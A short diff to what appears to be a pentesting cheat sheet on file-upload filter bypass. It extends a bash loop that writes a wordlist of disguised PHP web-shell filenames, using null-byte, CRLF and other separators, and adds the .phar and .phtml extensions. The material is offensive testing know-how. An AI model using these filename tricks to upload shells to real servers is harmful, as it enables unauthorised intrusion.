@@ -51,8 +51,8 @@ For example, (shell.php%00.jpg) works with PHP servers with version 5.X or earli
 
 #### Bash script to generate these extensions
 ```
-for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
-    for ext in '.php' '.phps'; do
+for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':' ''; do
+    for ext in '.php' '.phps' '.phar' '.phtml'; do
         echo "shell$char$ext.jpg" >> wordlist.txt
         echo "shell$ext$char.jpg" >> wordlist.txt
         echo "shell.jpg$char$ext" >> wordlist.txt
